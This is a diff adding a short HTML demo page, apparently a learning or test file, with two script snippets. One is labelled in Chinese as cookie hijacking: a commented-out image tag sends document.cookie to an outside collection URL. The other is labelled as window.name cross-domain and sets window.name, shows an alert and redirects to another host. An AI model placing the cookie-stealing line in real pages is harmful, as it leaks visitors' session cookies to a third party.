@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+</head>
+<body>
+    <script>
+        //cookie劫持
+        /*
+        var img = document.createElement("img");
+        img.src = "http://lanu.sinaapp.com/cookie.php?cookie="+escape(document.cookie);
+        document.body.appendChild(img);
+        */
+
+       //window.name跨域
+       window.name = 'test';
+       alert(document.domain + ' ' + window.name);
+       window.location = 'http://runstat.sinaapp.com';
+    </script>
+</body>
+</html>
